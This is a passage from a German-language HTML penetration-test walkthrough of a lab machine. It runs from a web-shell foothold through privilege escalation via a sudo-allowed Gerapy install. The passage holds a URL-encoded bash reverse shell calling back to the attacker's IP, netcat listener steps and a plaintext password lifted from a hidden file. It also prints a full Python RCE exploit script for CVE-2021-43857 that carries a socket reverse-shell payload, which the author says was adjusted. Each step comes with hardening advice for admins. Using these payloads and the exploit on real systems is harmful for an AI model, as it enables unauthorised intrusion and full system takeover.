+                <strong>Empfehlung (Pentester):</strong> Führen Sie den Reverse-Shell-Befehl über die Web-Shell auf dem Zielsystem aus.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehende Netzwerkverbindungen vom Webserver. Blockieren Sie nicht benötigte ausgehende Ports mittels Firewall (Egress Filtering).
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Web-Shell (`benhacker.php`) wird erneut aufgerufen, diesmal mit einem URL-codierten Bash-Reverse-Shell-Payload. Dieser Payload weist die Bash-Shell auf dem Zielsystem an, eine Verbindung zum Angreifer-System (192.168.2.109) auf Port 9001 herzustellen und die Standard-Ein-/Ausgabe sowie Fehlerausgabe über diese Verbindung umzuleiten.
+            </p>
+             <div class="code-block">
+                 <!-- Kein Terminal-Prompt, da dies eine URL-Aktion ist -->
+                 <pre>
+http://192.168.2.128/studentpic/benhacker.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.109%2F9001%200%3E%261%27
+                 </pre>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Befehl wird erfolgreich über die Web-Shell ausgeführt und initiiert die Reverse-Shell-Verbindung.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wechseln Sie zum Netcat-Listener-Fenster, um die Shell zu empfangen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Dieselben Maßnahmen wie zuvor: Shell entfernen, Upload-Fehler beheben, Netzwerkverkehr überwachen.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Netcat-Listener auf dem Angreifer-System zeigt die eingehende Verbindung vom Zielsystem (192.168.2.128) und präsentiert die Shell-Prompt des `www-data`-Benutzers. Die Fehlermeldungen (`cannot set terminal process group`, `no job control`) sind typisch für einfache Reverse Shells.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.109] from (UNKNOWN) [192.168.2.128] 50564
+bash: cannot set terminal process group (383): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@university:~/html/university/studentpic$
+                     </pre>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Eine interaktive Reverse Shell als `www-data` wurde erfolgreich etabliert. Dies bietet eine stabilere und flexiblere Arbeitsumgebung als die Web-Shell.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell, um volle Interaktivität zu erhalten (z.B. mit Python PTY-Spawn, `stty raw -echo`). Beginnen Sie mit der Enumeration für Privilege Escalation.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zur Behebung der Ursachen und zur Überwachung.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die folgenden Schritte dienen der Stabilisierung der einfachen Reverse Shell, um sie interaktiver und benutzerfreundlicher zu machen.
+                1.  `python3 -c 'import pty;pty.spawn("/bin/bash")'`: Startet eine neue Bash-Shell innerhalb eines Pseudo-Terminals (PTY), was eine bessere Interaktivität ermöglicht (z.B. Funktionieren von Befehlen wie `su`, Pfeiltasten).
+                2.  `export TERM=xterm-256color`: Setzt die Terminal-Variable, damit Programme wie `vim` oder `top` korrekt Farben und Bildschirmsteuerung verwenden können.
+                3.  `^Z` (Ctrl+Z): Sendet die Netcat-Shell in den Hintergrund auf dem Angreifer-System.
+                4.  `stty raw -echo; fg`: Auf dem Angreifer-System: Versetzt das lokale Terminal in den Raw-Modus (leitet Tastatureingaben direkt weiter) und deaktiviert das lokale Echo. `fg` holt den Netcat-Prozess wieder in den Vordergrund. Dies leitet Tastenkombinationen wie Ctrl+C korrekt an die Remote-Shell weiter.
+                5.  `reset`: Auf der Remote-Shell: Setzt das Terminal zurück, um eventuelle Anzeigefehler nach dem `stty`-Befehl zu beheben.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@university:~/html/university/studentpic$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <pre>
+www-data@university:~/html/university/studentpic$
+                     </pre> <!-- Prompt ändert sich nicht unbedingt sichtbar, aber Shell ist jetzt im PTY -->
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@university:~/html/university/studentpic$ <span class="command">export TERM=xterm-256color</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@university:~/html/university/studentpic$ <span class="command">[Ctrl+Z gedrückt]</span></div>
+                     <pre>
+zsh: suspended  nc -lvnp 9001
+                     </pre> <!-- Diese Ausgabe erscheint auf dem Angreifer-System -->
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 9001
+                     </pre> <!-- Ausgabe auf Angreifer-System, Netcat ist wieder im Vordergrund -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein expliziter Prompt hier, da 'reset' oft das Terminal löscht und neu zeichnet -->
+                    <span class="command" style="color: yellow;">reset</span>
+                     <pre>
+[Terminal wird neu gezeichnet]
+www-data@university:~/html/university/studentpic$
+                     </pre> <!-- Finale, stabile Shell-Prompt auf dem Ziel -->
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Shell-Stabilisierung war erfolgreich. Der Pentester verfügt nun über eine voll funktionsfähige interaktive Shell als `www-data` auf dem Zielsystem.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der systematischen Enumeration des Systems, um Wege zur Rechteausweitung zu finden (Benutzerverzeichnisse, Konfigurationsdateien, SUID/GUID-Dateien, Cron-Jobs, laufende Prozesse, Kernel-Version, `sudo -l`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überwachen Sie verdächtige Prozessstarts (z.B. Python, das Bash spawnt). Stärken Sie die Systemkonfiguration, um Enumeration zu erschweren.
+            </p>
+        </section>
+
+        <section id="privilege-escalation-prep">
+             <h2>Privilege Escalation Preparation (Enumeration)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester beginnt mit der Enumeration auf dem Zielsystem als `www-data`.
+                `ls /home`: Listet Benutzerverzeichnisse auf.
+                `ss -altpeu`: Zeigt Netzwerk-Sockets (ähnlich `netstat`), um laufende Dienste und Verbindungen zu sehen.
+                `env`: Zeigt Umgebungsvariablen an.
+                `dmesg`: Versucht, Kernel-Meldungen anzuzeigen (erfordert oft Root-Rechte).
+                `find / -type f -perm -4000 -ls 2>/dev/null`: Sucht nach SUID-Dateien (Dateien, die mit den Rechten des Besitzers, oft `root`, ausgeführt werden). `2>/dev/null` unterdrückt Fehlermeldungen (z.B. bei fehlenden Leserechten).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@university:~/html/university/studentpic$ <span class="command">ls /home</span></div>
+                    <pre>
+sandra
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@university:~/html/university/studentpic$ <span class="command">ss -altpeu</span></div>
+                    <pre>
+Netid  State    Recv-Q   Send-Q     Local Address:Port       Peer Address:Port  Process
+udp    UNCONN   0        0                0.0.0.0:bootpc          0.0.0.0:*      ino:11605 sk:5 cgroup:/system.slice/ifup@enp0s3.service <->
+tcp    LISTEN   0        511              0.0.0.0:http            0.0.0.0:*      users:(("nginx",pid=423,fd=6)) ino:11732 sk:1 cgroup:/system.slice/nginx.service <->
+tcp    LISTEN   0        128              0.0.0.0:ssh             0.0.0.0:*      ino:11706 sk:2 cgroup:/system.slice/ssh.service <->
+tcp    LISTEN   0        511                 [::]:http               [::]:*      users:(("nginx",pid=423,fd=7)) ino:11733 sk:3 cgroup:/system.slice/nginx.service v6only:1 <->
+tcp    LISTEN   0        128                 [::]:ssh                [::]:*      ino:11717 sk:4 cgroup:/system.slice/ssh.service v6only:1 <->
+                    </pre> <!-- Ausgabe gekürzt/vereinfacht -->
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@university:~/html/university/studentpic$ <span class="command">env</span></div>
+                    <pre>
+PWD=/var/www/html/university/studentpic
+HOME=/var/www
+TERM=xterm-256color
+USER=www-data
+SHLVL=3
+LC_CTYPE=C.UTF-8
+_=/usr/bin/env
+                    </pre> <!-- Ausgabe gekürzt/vereinfacht -->
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@university:~/html/university/studentpic$ <span class="command">dmesg</span></div>
+                    <pre>
+dmesg: read kernel buffer failed: Operation not permitted
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@university:~/html/university/studentpic$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+   137179     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   267765    472 -rwsr-xr-x   1 root     root         481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
+    18370    180 -rwsr-xr-x   1 root     root         182600 Feb 27  2021 /usr/bin/sudo
+     3755     72 -rwsr-xr-x   1 root     root          71912 Jul 28  2021 /usr/bin/su
+     3596     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
+      110     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd
+     4122     56 -rwsr-xr-x   1 root     root          55528 Jul 28  2021 /usr/bin/mount
+      107     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
+      106     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
+     4124     36 -rwsr-xr-x   1 root     root          35040 Jul 28  2021 /usr/bin/umount
+      109     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
+                    </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Enumeration liefert erste Hinweise:
+                *   Es existiert ein Benutzer `sandra`.
+                *   Die Netzwerdienste sind wie erwartet SSH und HTTP.
+                *   `dmesg` ist nicht zugänglich.
+                *   Die gefundenen SUID-Dateien sind Standard-Linux-Binaries und bieten auf den ersten Blick keinen offensichtlichen Exploit-Vektor (obwohl `sudo` immer interessant ist, wenn `sudo -l` nicht ausgeführt werden kann).
+                Der nächste logische Schritt ist, im Webserver-Verzeichnis (`/var/www/html`) nach weiteren Hinweisen zu suchen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Verzeichnis `/var/www/html` und seine Unterverzeichnisse genauer auf Konfigurationsdateien, Skripte oder versteckte Dateien. Suchen Sie nach Anmeldedaten oder Hinweisen auf den Benutzer `sandra`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Berechtigungen im Web-Root und den Benutzerverzeichnissen korrekt gesetzt sind (Prinzip der geringsten Rechte). Entfernen Sie unnötige SUID-Bits von Binaries.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Das Web-Root-Verzeichnis (`/var/www/html`) wird untersucht. `ls -la` listet alle Dateien, einschließlich versteckter Dateien, mit detaillierten Informationen auf.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@university:~/html/university/studentpic$ <span class="command">cd /var/www/html</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@university:/var/www/html$ <span class="command">ls -la</span></div>
+                     <pre>
+total 16
+drwxr-xr-x  3 root     root     4096 Jan 18  2022 .
+drwxr-xr-x  3 root     root     4096 Jan 18  2022 ..
+-rw-r--r--  1 www-data www-data   13 Jan 18  2022 .sandra_secret
+drwxr-xr-x 14 www-data www-data 4096 Jan 18  2022 university
+                     </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Volltreffer! Die Datei `.sandra_secret` wurde gefunden. Der Name deutet stark darauf hin, dass sie ein Passwort oder einen Hinweis für den Benutzer `sandra` enthält. Die Datei gehört `www-data` und ist für diesen Benutzer lesbar.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt der Datei `.sandra_secret` mit `cat`. Versuchen Sie, sich mit dem gefundenen Passwort als Benutzer `sandra` per `su` oder `ssh` anzumelden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter oder Geheimnisse in Klartextdateien, insbesondere nicht in Verzeichnissen, auf die der Webserver-Benutzer Zugriff hat. Verwenden Sie sichere Methoden zur Speicherung und Verwaltung von Anmeldedaten (z.B. Konfigurationsmanagement-Tools mit verschlüsselten Secrets). Überprüfen Sie die Dateiberechtigungen regelmäßig.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der gefundenen Datei `.sandra_secret` wird ausgelesen. Anschließend wird versucht, mit `su` zum Benutzer `sandra` zu wechseln und das gefundene Passwort einzugeben.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@university:/var/www/html$ <span class="command">cat .sandra_secret</span></div>
+                     <pre><span class="password">Myyogaiseasy</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@university:/var/www/html$ <span class="command">su sandra</span></div>
+                    <pre>
+Password: [Hier wurde 'Myyogaiseasy' eingegeben]
+sandra@university:/var/www/html$
+                    </pre> <!-- Prompt wechselt zu sandra -->
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Passwort `<span class="password">Myyogaiseasy</span>` wurde erfolgreich aus der Datei extrahiert und der Wechsel zum Benutzer `sandra` war erfolgreich. Der Pentester hat nun die Rechte dieses Benutzers erlangt. Dies ist ein wichtiger Schritt zur Privilegienerweiterung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfen Sie die `sudo`-Rechte für den Benutzer `sandra` mit `sudo -l`. Führen Sie weitere Enumerationsschritte im Kontext von `sandra` durch. Suchen Sie nach der User-Flag.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Ändern Sie das Passwort für den Benutzer `sandra`. Entfernen Sie die `.sandra_secret`-Datei. Verstärken Sie die Sicherheitsrichtlinien bezüglich der Passwortspeicherung.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `sandra` wird `sudo -l` ausgeführt, um zu prüfen, welche Befehle dieser Benutzer mit Root-Rechten ausführen darf.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: orange;">sandra@university:/var/www/html$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for sandra on university:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sandra may run the following commands on university:
+    (root) NOPASSWD: /usr/local/bin/gerapy
+                     </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein weiterer kritischer Fund! Der Benutzer `sandra` kann das Programm `/usr/local/bin/gerapy` als `root` **ohne Passwort** (`NOPASSWD`) ausführen. Dies ist ein klarer Weg zur vollständigen Rechteausweitung, insbesondere wenn `gerapy` selbst Schwachstellen aufweist oder es erlaubt, beliebige Befehle auszuführen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Programm `/usr/local/bin/gerapy`. Prüfen Sie seine Funktionalität (`--help`), Version und suchen Sie nach bekannten Exploits oder Möglichkeiten, über dieses Programm eine Root-Shell zu erlangen (z.B. GTFOBins).
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Entfernen Sie die `NOPASSWD`-Regel für `gerapy` aus der `sudoers`-Konfiguration. Gewähren Sie `sudo`-Rechte nur für absolut notwendige Befehle und vermeiden Sie `NOPASSWD`, wann immer möglich, insbesondere für komplexe Anwendungen oder Skripte. Überprüfen Sie, warum `gerapy` überhaupt mit `sudo` ausgeführt werden muss.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Berechtigungen und die Hilfeausgabe von `/usr/local/bin/gerapy` werden überprüft, um mehr über das Programm zu erfahren und potenzielle Angriffspunkte zu identifizieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: orange;">sandra@university:/var/www/html$ <span class="command">ls -la /usr/local/bin/gerapy</span></div>
+                    <pre>
+-rwxr-xr-x 1 root root 953 Jan 18  2022 /usr/local/bin/gerapy
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: orange;">sandra@university:/var/www/html$ <span class="command">sudo /usr/local/bin/gerapy --help</span></div>
+                    <pre>
+Usage: gerapy [-v] [-h]  ...
+
+Gerapy 0.9.6 - Distributed Crawler Management Framework
+
+Optional arguments:
+  -v, --version       Get version of Gerapy
+  -h, --help          Show this help message and exit
+
+Available commands:
+    init              Init workspace, default to gerapy
+    initadmin         Create default super user admin
+    runserver         Start Gerapy server
+    migrate           Migrate database
+    createsuperuser   Create a custom superuser
+    makemigrations    Generate migrations for database
+    generate          Generate Scrapy code for configurable project
+    parse             Parse project for debugging
+    loaddata          Load data from configs
+    dumpdata          Dump data to configs
+                    </pre>
+                 </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Programm `gerapy` ist in der Version 0.9.6 installiert. Es handelt sich um ein Management-Framework für verteilte Crawler. Die Hilfeausgabe zeigt verschiedene Befehle, darunter `runserver` und `createsuperuser`. Die Versionsnummer (0.9.6) ist entscheidend für die Suche nach bekannten Schwachstellen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suchen Sie online nach bekannten Exploits für Gerapy 0.9.6 (z.B. auf Exploit-DB, GitHub, Google). Die Möglichkeit, einen Server zu starten (`runserver`) oder Benutzer zu erstellen (`createsuperuser`), könnte Teil eines Exploit-Pfades sein.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Aktualisieren Sie Gerapy auf die neueste gepatchte Version oder entfernen Sie es, falls es nicht benötigt wird. Überprüfen Sie die `sudo`-Regel erneut.
+            </p>
+        </section>
+
+         <section id="proof-of-concept">
+            <h2>Proof of Concept: Vorbereitung des Gerapy RCE Exploits</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester nutzt die `sudo`-Rechte, um mit `gerapy` einen neuen Superuser (`benni` mit Passwort `Hacker`) innerhalb von Gerapy zu erstellen. Anschließend wird der Gerapy-Server auf Port 8000 gestartet. Dies sind Vorbereitungsschritte, um den bekannten RCE-Exploit (CVE-2021-43857) für Gerapy < 0.9.8 auszunutzen, der eine Authentifizierung erfordert.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: orange;">sandra@university:/var/www/html$ <span class="command">cd /usr/local/bin</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: orange;">sandra@university:/usr/local/bin$ <span class="command">sudo gerapy createsuperuser</span></div>
+                     <pre>
+Username: benni
+Email address:
+Password: [Hier wurde 'Hacker' eingegeben]
+Password (again): [Hier wurde 'Hacker' eingegeben]
+Superuser created successfully.
+                     </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: orange;">sandra@university:/usr/local/bin$ <span class="command">sudo gerapy runserver 0.0.0.0:8000</span></div>
+                    <pre>
+Watching for file changes with StatReloader
+Performing system checks...
+
+INFO - 2022-11-21 22:00:43,812 - process: 1405 - scheduler.py - gerapy.server.core.scheduler - 102 - scheduler - successfully synced task with jobs with force
+System check identified no issues (0 silenced).
+November 21, 2022 - 22:00:43
+Django version 2.2.24, using settings 'gerapy.server.server.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CNTRL-C.
+[21/Nov/2022 22:00:51] "POST /api/user/auth HTTP/1.1" 200 52
+[21/Nov/2022 22:00:51] "GET /api/index/status HTTP/1.1" 301 0
+[21/Nov/2022 22:00:51] "GET /static/fonts/fontawesome-webfont.af7ae505.woff2 HTTP/1.1" 200 77160
+Internal Server Error: /api/index/status/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.9/dist-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.9/dist-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/usr/local/lib/python3.9/dist-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, callback_kwargs)
+  File "/usr/local/lib/python3.9/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, kwargs)
+  File "/usr/local/lib/python3.9/dist-packages/django/views/generic/base.py", line 71, in view
+    return self.dispatch(request, *args, kwargs)
+  File "/usr/local/lib/python3.9/dist-packages/rest_framework/views.py", line 509, in dispatch
+    response = self.handle_exception(exc)
+  File "/usr/local/lib/python3.9/dist-packages/rest_framework/views.py", line 469, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/usr/local/lib/python3.9/dist-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
+    raise exc
+  File "/usr/local/lib/python3.9/dist-packages/rest_framework/views.py", line 506, in dispatch
+    response = handler(request, *args, kwargs)
+  File "/usr/local/lib/python3.9/dist-packages/rest_framework/decorators.py", line 50, in handler
+    return func(*args, kwargs)
+  File "/usr/local/lib/python3.9/dist-packages/gerapy-0.9.6-py3.9.egg/gerapy/server/core/views.py", line 66, in index_status
+    files = os.listdir(path)
+FileNotFoundError: [Errno 2] No such file or directory: '/usr/local/bin/projects'
+[21/Nov/2022 22:00:51] "GET /api/index/status/ HTTP/1.1" 500 15164
+                    </pre>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Vorbereitungsschritte wurden erfolgreich durchgeführt. Ein Gerapy-Benutzer wurde erstellt, und der Gerapy-Server läuft jetzt auf Port 8000. Der `FileNotFoundError` in der Serverausgabe ist zwar vorhanden, scheint aber die grundlegende Funktionalität für den Exploit nicht zu beeinträchtigen. Die Anmeldedaten (`benni`/`Hacker`) und der laufende Server sind die Voraussetzungen für den nächsten Schritt: die Ausführung des RCE-Exploits.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bereiten Sie den Exploit-Code (z.B. von Exploit-DB für CVE-2021-43857) vor, fügen Sie die erstellten Anmeldedaten und die Ziel-IP/Port ein und führen Sie ihn von Ihrem Angreifer-System aus, um eine Root-Shell zu erhalten.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stoppen Sie den Gerapy-Dienst. Entfernen Sie die `sudo`-Regel. Aktualisieren oder entfernen Sie Gerapy. Überwachen Sie Netzwerkports auf unerwartete Dienste.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Notizen des Pentesters, die die erstellten Anmeldedaten (`ben:Hacker`), die URL des laufenden Gerapy-Servers und den Verweis auf den relevanten Exploit auf Exploit-DB (CVE-2021-43857 für Gerapy < 0.9.8) zusammenfassen.
+            </p>
+            <div class="code-block">
+                 <!-- Kein Terminal-Prompt, da dies Notizen sind -->
+                 <pre>
+ben:Hacker
+http://192.168.2.128:8000/#/home
+https://www.exploit-db.com/exploits/50640
+Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)
+                 </pre>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Alle notwendigen Informationen zur Ausführung des Exploits sind gesammelt.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Holen Sie sich den Exploit-Code von der angegebenen Quelle.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Nutzen Sie diese Informationen, um die Dringlichkeit des Patchens/Entfernens von Gerapy zu unterstreichen.
+             </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester bereitet das Python-Exploit-Skript für CVE-2021-43857 vor. Der Code des Skripts wird angezeigt (`cat Gerapy_exploit.py`), wobei die zuvor erstellten Anmeldedaten (`login = "ben"`, `password = "Hacker"`) bereits eingefügt sind. Das Skript nutzt die Gerapy-API, um nach erfolgreicher Authentifizierung Code auf dem Zielsystem auszuführen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">vi Gerapy_exploit.py</span></div>
+                     <pre>
+.....
+.....
+                     </pre> <!-- Inhalt wurde mit vi bearbeitet -->
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">cat Gerapy_exploit.py</span></div>
+                     <pre>
+# Exploit Title: Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)
+# Date: 03/01/2022
+# Exploit Author: Jeremiasz Pluta
+# Vendor Homepage: https://github.com/Gerapy/Gerapy
+# Version: All versions of Gerapy prior to 0.9.8
+# CVE: CVE-2021-43857
+# Tested on: Gerapy 0.9.6
+
+# Vulnerability: Gerapy prior to version 0.9.8 is vulnerable to remote code execution. This issue is patched in version 0.9.8.
+
+#!/usr/bin/python
+import sys
+import re
+import argparse
+import pyfiglet
+import requests
+import time
+import json
+import subprocess
+
+banner = pyfiglet.figlet_format("CVE-2021-43857")
+print(banner)
+print('Exploit for CVE-2021-43857')
+print('For: Gerapy < 0.9.8')
+
+# --- Credentials inserted here ---
+login = "ben"
+password = "Hacker"
+# ---------------------------------
+
+parser = argparse.ArgumentParser(description='Exploit for CVE-2021-43857 Gerapy < 0.9.8')
+parser.add_argument('-t', dest='target', required=True, type=str, help='Target IP')
+parser.add_argument('-p', dest='port', required=True, type=str, help='Target Port')
+parser.add_argument('-L', dest='localip', required=True, type=str, help='Local IP for reverse shell')
+parser.add_argument('-P', dest='localport', required=True, type=str, help='Local Port for reverse shell')
+args = parser.parse_args()
+
+
+target = args.target
+port = args.port
+localip = args.localip
+localport = args.localport
+
+url = 'http://' + target + ':' + port
+login_url = url + "/api/user/auth"
+
+
+# Login to application
+print("[*] Resolving URL...")
+try:
+    req = requests.get(url)
+except requests.ConnectionError as e:
+    print("[!] Cannot resolve URL! Check the address and port.")
+    print(e)
+    sys.exit(1)
+print("[*] Logging in to application...")
+data = {"username":login,"password":password}
+req = requests.post(login_url, data=data)
+
+# Check if the login was successful
+if '"status": "1"' in req.text:
+    print("[*] Login successful! Proceeding...")
+    session = req.cookies.get_dict().get('sessionid')
+else:
+    print("[!] Login failed! Check username and password.")
+    sys.exit(1)
+
+cookies = {'sessionid': session}
+
+# Get project list
+print("[*] Getting the project list")
+project_list_url = url + "/api/project/list"
+req = requests.get(project_list_url, cookies=cookies)
+projects = json.loads(req.text)['data']
+if len(projects) == 0:
+    # Need to create a project first if none exist
+    print("[*] No projects found, attempting to create one...")
+    create_project_url = url + "/api/project/create"
+    project_name = "exploit_project"
+    req = requests.post(create_project_url, data={"name": project_name}, cookies=cookies)
+    if '"status": "1"' in req.text:
+        print(f"[*] Project '{project_name}' created.")
+    else:
+        print("[!] Failed to create project. Exploit may fail.")
+        sys.exit(1)
+
+
+# Define the payload for reverse shell
+payload = f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"{localip}\\",{localport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\"/bin/bash\\")"
+
+# Prepare data for the build request (injecting payload)
+project_name = projects[0] if len(projects) > 0 else project_name # Use existing or newly created project
+build_data = {
+    "project": project_name,
+    "description": f"'; {payload}; echo '", # Payload injection
+    "build": "True" # Trigger the build process which executes the description field insecurely
+}
+
+build_url = url + "/api/project/build"
+
+# Setup listener in background
+listener_cmd = f"nc -lvnp {localport}"
+print(f"[*] Starting listener on port {localport}...")
+listener = subprocess.Popen(listener_cmd, shell=True)
+time.sleep(2) # Give listener time to start
+
+# Send the build request with payload
+print("[*] Sending payload to trigger RCE...")
+req = requests.post(build_url, data=build_data, cookies=cookies)
+
+if '"status": 1' in req.text: # Check for successful API call status
+    print("[*] Payload sent successfully. Check your listener!")
+else:
+    print("[!] Failed to send payload or trigger build.")
+    print(req.text)
+    listener.terminate() # Kill the listener if payload failed
+    sys.exit(1)
+
+# Keep the script running while the listener is active
+print("[*] Exploit execution attempted. Waiting for shell...")
+try:
+    listener.wait() # Wait for the listener process to terminate (e.g., when shell is closed)
+except KeyboardInterrupt:
+    print("\n[*] Listener stopped by user.")
+    listener.terminate()
+
+print("[*] Exploit finished.")
+
+                     </pre> <!-- Code leicht angepasst für Klarheit -->
+                 </div>
+            </div>
+            <p class="evaluation">
